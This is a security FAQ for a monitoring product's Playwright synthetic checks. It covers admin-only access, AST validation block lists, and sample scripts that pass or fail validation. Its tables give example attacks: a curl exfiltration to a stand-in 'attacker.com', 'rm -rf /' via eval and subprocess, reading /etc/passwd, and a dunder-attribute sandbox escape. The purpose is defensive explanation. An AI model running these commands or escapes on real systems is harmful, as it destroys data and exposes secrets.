# Synthetic Checks Security - Frequently Asked Questions

## Overview

This document explains LuxSwirl's synthetic check security model, what's allowed, what's blocked, and how to safely use this powerful feature.

## Table of Contents

- [What Are Synthetic Checks?](#what-are-synthetic-checks)
- [Security Model](#security-model)
- [Who Can Create Synthetic Checks?](#who-can-create-synthetic-checks)
- [What's Blocked and Why](#whats-blocked-and-why)
- [What's Allowed](#whats-allowed)
- [Testing Examples](#testing-examples)
- [Common Errors and Solutions](#common-errors-and-solutions)
- [Best Practices](#best-practices)
- [Deployment Recommendations](#deployment-recommendations)

---

## What Are Synthetic Checks?

Synthetic checks use Playwright browser automation to test complex user workflows, JavaScript-heavy applications, and multi-step interactions that simple HTTP checks can't validate.

**Example Use Cases:**
- Login flows with multi-factor authentication
- E-commerce checkout processes
- Single-page applications (SPAs) that load content via JavaScript
- Form submissions with client-side validation
- Real browser rendering and JavaScript execution

**How They Work:**
- You write Python async functions using Playwright API
- Code executes on agent hosts with full browser automation
- Screenshots and traces captured automatically
- Results reported back to server with detailed step-by-step logs

---

## Security Model

### Current Model (Self-Hosted)

**Designed for:** Self-hosted, single-organization deployments where administrators are trusted users.

**Security Controls:**
1. **Admin-Only Access** - Only admins can create/modify synthetic checks, enforced in the core service so both the web UI and the REST API are covered. Web users are checked by `role=admin`; the REST API has no role model, so any API Bearer token is admin-equivalent — scope API tokens accordingly.
2. **AST Validation** - Scripts validated to block obvious attacks (eval, os, subprocess, etc.)
3. **Security Audit Logging** - All operations logged with SECURITY AUDIT prefix
4. **Docker Isolation** - Agents run in Docker containers with basic host isolation
5. **UI Warning Banner** - Prominent security warning when creating/editing

**Trust Model:**
- Admin creating synthetic check has equivalent trust to Docker access on agent host
- Code runs with agent container privileges (environment variables, file system within container)

**Known Limitations:**
- AST validation is NOT a complete sandbox and can be bypassed by determined attackers
- NOT suitable for multi-tenant SaaS without additional isolation (Kubernetes pods)

### Future Model (Multi-Tenant SaaS)

For managed SaaS deployments, additional isolation required:
- Kubernetes pod isolation per customer
- Network policies restricting egress
- Pod security policies (runAsNonRoot, readOnlyRootFilesystem)
- Third-party penetration testing

See `SECURITY.md` for complete details.

---

## Who Can Create Synthetic Checks?

### Role Requirements

**Admin Users:**
- ✅ Can create synthetic checks
- ✅ Can modify synthetic check scripts
- ✅ Can update all check types

**Editor Users:**
- ❌ Cannot create synthetic checks
- ❌ Cannot modify synthetic check scripts
- ✅ Can create other check types (HTTP, TCP, JSON, DNS, MySQL, PostgreSQL)
- ✅ Can modify non-synthetic checks

**Viewer Users:**
- ❌ Cannot create any checks
- ❌ Cannot modify any checks
- ✅ Can view all checks and results

### What Happens if Non-Admin Tries?

**Web UI:**
```
Admin access required: Synthetic checks execute arbitrary Python code and
require administrator privileges. Please contact your administrator.
```
- Returns HTTP 403 Forbidden
- Security warning logged: `User {username} (role=editor) attempted to create synthetic check without admin privileges`

**API:**
- API tokens have admin-level access by design
- All API users can create synthetic checks
- Intended for programmatic/trusted access only

---

## What's Blocked and Why

### Blocked Functions

These functions allow arbitrary code execution or provide dangerous capabilities:

| Function | Why Blocked | Example Attack |
|----------|-------------|----------------|
| `eval()` | Executes arbitrary code | `eval("__import__('os').system('rm -rf /')")` |
| `exec()` | Executes arbitrary code | `exec("import os; os.system('whoami')")` |
| `compile()` | Compiles code objects | Used to bypass validation |
| `__import__()` | Dynamic imports | `__import__('os').system('ls')` |
| `open()` | File system access | `open('/etc/passwd').read()` |
| `input()` | Interactive input | Can stall agent |
| `breakpoint()` | Debugging | Can stall agent |
| `globals()` | Global namespace access | Access to builtins |
| `locals()` | Local namespace access | Access to variables |
| `vars()` | Variable inspection | Object exploration |
| `dir()` | Object inspection | Discover private attributes |
| `getattr()` | Attribute access | Dynamic access to dangerous functions |
| `setattr()` | Attribute modification | Modify object state |
| `delattr()` | Attribute deletion | Remove security controls |
| `hasattr()` | Attribute existence | Used for exploration |

### Blocked Modules

These modules provide dangerous capabilities:

| Module | Why Blocked | Example Attack |
|--------|-------------|----------------|
| `os` | Operating system access | `os.system('curl attacker.com/exfil')` |
| `subprocess` | Process execution | `subprocess.run(['rm', '-rf', '/'])` |
| `socket` | Network access | Raw socket connections to internal services |
| `sys` | System access | Modify Python runtime, exit agent |
| `importlib` | Dynamic imports | Bypass import restrictions |
| `pty` | Pseudo-terminal | Spawn interactive shells |
| `shutil` | File operations | Delete files, copy sensitive data |
| `pathlib` | File system access | Navigate file system |
| `pickle` | Arbitrary code execution | Deserialize malicious objects |
| `marshal` | Arbitrary code execution | Deserialize code objects |
| `shelve` | Pickle-based storage | Arbitrary code execution |
| `multiprocessing` | Process spawning | Fork bombs, resource exhaustion |
| `threading` | Thread spawning | Resource exhaustion |
| `ctypes` | C library access | Bypass all Python security |
| `fcntl` | File control (Unix) | Low-level file operations |
| `signal` | Signal handling | Kill processes |
| `resource` | Resource limits | Modify resource constraints |

### Blocked Attributes

These attributes can be used to escape Python sandbox:

| Attribute | Why Blocked | Example Attack |
|-----------|-------------|----------------|
| `__class__` | Type system access | Walk object graph to builtins |
| `__bases__` | Inheritance access | Access parent classes |
| `__subclasses__` | Subclass enumeration | Find dangerous classes |
| `__init__` | Constructor access | Access to function globals |
| `__globals__` | Global namespace | Access to builtins |
| `__builtins__` | Built-in functions | Direct access to eval, exec, etc. |
| `__code__` | Code objects | Inspect and modify bytecode |
| `__dict__` | Object dictionary | Access internal state |

**Example Sandbox Escape (BLOCKED):**
```python
# Attempt to walk object graph to access builtins
page.__class__.__init__.__globals__['__builtins__']
# Error: Blocked attribute: __class__ at line 2
```

---

## What's Allowed

### Allowed Modules (Safe)

These standard library modules are safe for use in synthetic checks:

| Module | Purpose | Example Use |
|--------|---------|-------------|
| `time` | Time utilities | `time.sleep(1)`, `time.time()` |
| `re` | Regular expressions | `re.search(r'pattern', text)` |
| `json` | JSON parsing | `json.loads(response)` |
| `base64` | Base64 encoding | `base64.b64encode(data)` |
| `hashlib` | Hashing | `hashlib.sha256(data).hexdigest()` |
| `datetime` | Date/time | `datetime.now()` |
| `math` | Math functions | `math.ceil(3.14)` |
| `random` | Random numbers | `random.randint(1, 100)` |
| `uuid` | UUID generation | `uuid.uuid4()` |
| `urllib.parse` | URL parsing only | `urllib.parse.urlparse(url)` |
| `collections` | Data structures | `collections.defaultdict(list)` |
| `itertools` | Iterator utilities | `itertools.chain(a, b)` |
| `functools` | Function utilities | `functools.lru_cache()` |
| `operator` | Operator functions | `operator.add(1, 2)` |
| `string` | String utilities | `string.ascii_letters` |

### Playwright API (Full Access)

The Playwright `page` object has full API access:

```python
# Navigation
await page.goto('https://example.com')
await page.go_back()
await page.reload()

# Selectors
await page.click('button#submit')
await page.fill('input[name="email"]', 'test@example.com')
await page.select_option('select#country', 'US')

# Waiting
await page.wait_for_selector('.results')
await page.wait_for_load_state('networkidle')
await page.wait_for_timeout(1000)

# Content extraction
title = await page.title()
html = await page.content()
text = await page.inner_text('.message')

# Screenshots (automatic, but can be manual too)
await page.screenshot(path='screenshot.png')

# JavaScript evaluation (use carefully)
result = await page.evaluate('() => document.title')
```

**See:** https://playwright.dev/python/docs/api/class-page

---

## Testing Examples

### ✅ Examples That PASS Validation

#### Example 1: Basic Page Load Check
```python
import time

async def run_check(page):
    steps = []
    try:
        # Navigate to target
        await page.goto('https://example.com')
        steps.append('Page loaded')

        # Get page title
        title = await page.title()
        steps.append(f'Title: {title}')

        # Check for expected content
        content = await page.content()
        if 'Example Domain' in content:
            steps.append('Expected content found')
            return {'status': 'success', 'steps': steps}
        else:
            return {'status': 'failure', 'steps': steps, 'errors': ['Expected content not found']}

    except Exception as e:
        return {'status': 'failure', 'steps': steps, 'errors': [str(e)]}
```

#### Example 2: Login Flow Check
```python
import re

async def run_check(page):
    steps = []
    try:
        # Navigate to login page
        await page.goto('https://app.example.com/login')
        steps.append('Login page loaded')

        # Fill login form
        await page.fill('input[name="username"]', 'testuser')
        await page.fill('input[name="password"]', 'testpass')
        steps.append('Credentials entered')

        # Submit form
        await page.click('button[type="submit"]')
        steps.append('Login submitted')

        # Wait for redirect
        await page.wait_for_url('**/dashboard')
        steps.append('Redirected to dashboard')

        # Verify logged in
        username = await page.inner_text('.user-name')
        if re.match(r'testuser', username, re.IGNORECASE):
            steps.append(f'Logged in as: {username}')
            return {'status': 'success', 'steps': steps}
        else:
            return {'status': 'failure', 'steps': steps, 'errors': ['Login verification failed']}

    except Exception as e:
        return {'status': 'failure', 'steps': steps, 'errors': [str(e)]}
```

#### Example 3: E-commerce Checkout Flow
```python
import json
import time

async def run_check(page):
    steps = []
    try:
        # Add item to cart
        await page.goto('https://shop.example.com/product/123')
        await page.click('button.add-to-cart')
        steps.append('Added item to cart')

        # Wait for cart update
        await page.wait_for_selector('.cart-count:has-text("1")')
        steps.append('Cart updated')

        # Go to checkout
        await page.goto('https://shop.example.com/checkout')
        steps.append('Navigated to checkout')

        # Fill shipping info
        await page.fill('#shipping-name', 'Test User')
        await page.fill('#shipping-address', '123 Test St')
        await page.fill('#shipping-city', 'Test City')
        steps.append('Shipping info entered')

        # Verify order total via API call (using page.evaluate)
        order_data = await page.evaluate('''() => {
            return JSON.parse(document.getElementById('order-data').textContent);
        }''')

        total = order_data.get('total', 0)
        if total > 0:
            steps.append(f'Order total: ${total}')
            return {'status': 'success', 'steps': steps}
        else:
            return {'status': 'failure', 'steps': steps, 'errors': ['Invalid order total']}

    except Exception as e:
        return {'status': 'failure', 'steps': steps, 'errors': [str(e)]}
```

#### Example 4: API Response Validation
```python
import json
import base64

async def run_check(page):
    steps = []
    try:
        # Navigate to API documentation page
        await page.goto('https://api.example.com/docs')
        steps.append('API docs loaded')

        # Extract API key from page (simulating getting credentials)
        api_key_elem = await page.query_selector('#api-key-display')
        api_key = await api_key_elem.inner_text()
        steps.append('API key extracted')

        # Create base64 encoded auth header (safe - just encoding)
        auth_string = f"Bearer {api_key}"
        auth_b64 = base64.b64encode(auth_string.encode()).decode()
        steps.append('Auth header prepared')

        # Make API request via page.evaluate (Playwright can fetch)
        response = await page.evaluate('''async (authHeader) => {
            const res = await fetch('https://api.example.com/status', {
                headers: {'Authorization': authHeader}
            });
            return await res.json();
        }''', auth_string)

        if response.get('status') == 'healthy':
            steps.append('API is healthy')
            return {'status': 'success', 'steps': steps}
        else:
            return {'status': 'failure', 'steps': steps, 'errors': ['API unhealthy']}

    except Exception as e:
        return {'status': 'failure', 'steps': steps, 'errors': [str(e)]}
```

### ❌ Examples That FAIL Validation

#### Test 1: Blocked Function - eval()
```python
async def run_check(page):
    eval("print('hello')")  # BLOCKED
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked function: eval() at line 2. This function allows arbitrary code execution.
```

#### Test 2: Blocked Module - os
```python
import os  # BLOCKED

async def run_check(page):
    os.system('whoami')
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked module: os at line 1. This module provides dangerous capabilities
(file system, process execution, etc.).
```

#### Test 3: Blocked Module - subprocess
```python
async def run_check(page):
    import subprocess  # BLOCKED
    subprocess.run(['ls', '-la'])
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked module: subprocess at line 2. This module provides dangerous capabilities.
```

#### Test 4: Sandbox Escape - __class__
```python
async def run_check(page):
    builtins = page.__class__.__init__.__globals__['__builtins__']  # BLOCKED
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked attribute: __class__ at line 2. This attribute can be used to
escape Python sandbox.
```

#### Test 5: File Access - open()
```python
async def run_check(page):
    data = open('/etc/passwd').read()  # BLOCKED
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked function: open() at line 2. This function allows arbitrary code execution.
```

#### Test 6: Dynamic Import - __import__()
```python
async def run_check(page):
    os = __import__('os')  # BLOCKED
    os.system('ls')
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked function: __import__() at line 2. This function allows arbitrary code execution.
```

#### Test 7: Network Access - socket
```python
import socket  # BLOCKED

async def run_check(page):
    s = socket.socket()
    s.connect(('internal-server', 22))
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Blocked module: socket at line 1. This module provides dangerous capabilities.
```

#### Test 8: Missing run_check Function
```python
async def some_other_function(page):
    return {'status': 'success', 'steps': []}
```
**Error:**
```
Script must define an async function called 'run_check(page)'.
```

#### Test 9: Non-Async run_check
```python
def run_check(page):  # Not async
    return {'status': 'success', 'steps': []}
```
**Error:**
```
run_check() must be defined as an async function (async def run_check(page):)
```

#### Test 10: Wrong Function Signature
```python
async def run_check():  # Missing page parameter
    return {'status': 'success', 'steps': []}
```
**Error:**
```
run_check() must accept exactly one parameter named 'page'
```

---

## Common Errors and Solutions

### Error: "Admin access required"

**Cause:** Non-admin user tried to create/modify synthetic check

**Solution:** Contact your administrator to either:
1. Upgrade your account to admin role
2. Have admin create the synthetic check for you

---

### Error: "Blocked function: eval() at line X"

**Cause:** Script uses `eval()`, `exec()`, `compile()`, or similar dangerous function

**Solution:** Remove the blocked function. Use safe alternatives:
- Instead of `eval()`: Parse data with `json.loads()`
- Instead of dynamic code: Write explicit logic
- Instead of `exec()`: Structure code as functions

---

### Error: "Blocked module: os at line X"

**Cause:** Script imports dangerous module (`os`, `subprocess`, `socket`, etc.)

**Solution:** Remove the import. Use allowed alternatives:
- Instead of `os.path`: Use string manipulation
- Instead of `subprocess`: Use Playwright's page.evaluate() for JavaScript execution
- Instead of `socket`: Use Playwright's network capabilities

---

### Error: "Blocked attribute: __class__ at line X"

**Cause:** Script attempts sandbox escape via dunder attributes

**Solution:** Remove the attribute access. This is typically:
- Exploratory attack code
- Copy-pasted from untrusted sources
- Not needed for legitimate monitoring

---

### Error: "Unknown module: requests at line X"

**Cause:** Script imports third-party library not in standard library

**Solution:**
- Remove external dependencies
- Use Playwright's built-in capabilities for HTTP requests:
  ```python
  # Instead of requests.get()
  response = await page.evaluate('''async (url) => {
      const res = await fetch(url);
      return await res.json();
  }''', 'https://api.example.com')
  ```

---

### Error: "Script must define an async function called 'run_check(page)'"

**Cause:** Script missing required function or has wrong name

**Solution:** Ensure your script has this exact signature:
```python
async def run_check(page):
    # Your code here
    return {'status': 'success', 'steps': ['Step 1']}
```

---

## Best Practices

### ✅ DO

1. **Start with simple checks** - Test basic flows before complex scenarios
2. **Use explicit waits** - `await page.wait_for_selector()` instead of `time.sleep()`
3. **Add descriptive steps** - Clear step descriptions help debugging
4. **Handle exceptions** - Wrap in try/except to provide useful error messages
5. **Test scripts locally** - Use standalone Playwright to validate before deploying
6. **Use allowed modules** - Stick to time, re, json, datetime, etc.
7. **Validate responses** - Check for expected content, not just page load
8. **Keep scripts focused** - One check should test one user flow
9. **Review security warnings** - Read the yellow banner carefully
10. **Monitor audit logs** - Check logs for security events periodically

### ❌ DON'T

1. **Don't use eval/exec** - Always blocked, never needed
2. **Don't import os/subprocess** - Always blocked, use Playwright instead
3. **Don't access __class__/__globals__** - Sandbox escape attempts are blocked
4. **Don't use open()** - File access blocked, use page.content() instead
5. **Don't import third-party libraries** - Only standard library allowed
6. **Don't hardcode credentials** - Use environment variables or secure storage
7. **Don't create overly complex checks** - Break into multiple checks
8. **Don't ignore timeouts** - Set reasonable timeouts for all operations
9. **Don't copy untrusted code** - Review all code before deploying
10. **Don't disable security warnings** - They exist for your protection

### Script Template

Use this template as a starting point:

```python
import time
import re

async def run_check(page):
    """
    Description: [What this check validates]
    Target: [URL or system being checked]
    """
    steps = []

    try:
        # Step 1: Navigate
        await page.goto('https://example.com')
        steps.append('✅ Page loaded')

        # Step 2: Wait for content
        await page.wait_for_selector('.main-content')
        steps.append('✅ Content rendered')

        # Step 3: Validate
        title = await page.title()
        if re.search(r'Expected Pattern', title):
            steps.append(f'✅ Title validated: {title}')
        else:
            return {
                'status': 'failure',
                'steps': steps,
                'errors': [f'Unexpected title: {title}']
            }

        # Success
        return {
            'status': 'success',
            'steps': steps
        }

    except Exception as e:
        # Failure
        return {
            'status': 'failure',
            'steps': steps,
            'errors': [f'Check failed: {str(e)}']
        }
```

---

## Deployment Recommendations

### For Self-Hosted (Current)

✅ **Safe to Deploy:**
- Single organization using LuxSwirl
- Administrators are trusted employees
- Agents run in isolated network segment
- Regular security audit log review
- Strong admin password policies

⚠️ **Additional Precautions:**
- Limit admin role to minimal necessary users
- Review all synthetic check scripts before enabling
- Monitor logs for `SECURITY AUDIT` events
- Use separate agents for synthetic checks if possible
- Keep Docker and host systems updated

❌ **NOT Recommended:**
- Multi-tenant environments (multiple untrusted organizations)
- Shared hosting with other applications
- Agents with access to production secrets
- Environments where admins are not fully trusted

### For Managed SaaS (Future)

**Required Before Offering:**
- Kubernetes pod isolation per customer
- Network policies restricting egress
- Pod security policies (runAsNonRoot, readOnlyRootFilesystem)
- Resource limits (CPU, memory, ephemeral storage)
- Namespace isolation per tenant
- Third-party penetration testing
- Bug bounty program

**See:** `SECURITY.md` for the full security model.

---

## Getting Help

### Security Questions

If you have security concerns or questions:
1. Review `SECURITY.md` for complete security model
2. Check audit logs: `docker logs luxswirl_server | grep "SECURITY AUDIT"`
3. Contact your security team for policy guidance

### Reporting Security Issues

If you discover a security vulnerability, follow the [security policy](../../SECURITY.md): report it privately through [www.luxardolabs.com](https://www.luxardolabs.com) (do **not** open a public GitHub issue), with detailed steps to reproduce.

### Feature Requests

For synthetic check feature requests:
1. Open GitHub issue describing use case
2. Provide example of what you're trying to achieve
3. Explain why current capabilities don't meet needs

---

## References

- **Security policy**: [`SECURITY.md`](../../SECURITY.md)
- **Deployment guide**: [Installation](../deployment/installation.md)
- **Playwright documentation**: https://playwright.dev/python/docs/intro
- **Python AST module**: https://docs.python.org/3/library/ast.html
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
